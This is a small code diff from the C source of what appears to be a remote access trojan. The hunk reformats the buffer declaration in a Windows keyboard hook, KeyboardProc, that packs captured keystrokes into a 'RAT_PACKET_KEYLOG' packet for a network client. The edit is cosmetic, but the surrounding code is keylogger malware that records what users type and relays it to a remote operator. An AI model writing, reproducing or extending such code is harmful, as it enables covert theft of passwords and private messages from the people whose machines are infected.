@@ -44,9 +44,8 @@ static SOCKET init_client(void) {
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
   static uint64_t chars_in_cur_line = 0;
-  static char
-      key_buf[DEFAULT_KEYLOG_BUFLEN *
-              2]; // allocate more than necessary to avoid race condition
+  // allocate more than necessary to avoid race condition
+  static char key_buf[DEFAULT_KEYLOG_BUFLEN * 2];
   static ratpacket_t *p = (ratpacket_t *)key_buf;
   p->op = RAT_PACKET_KEYLOG;
   p->data_len = RAT_KEYLOG_DATA_SIZE;
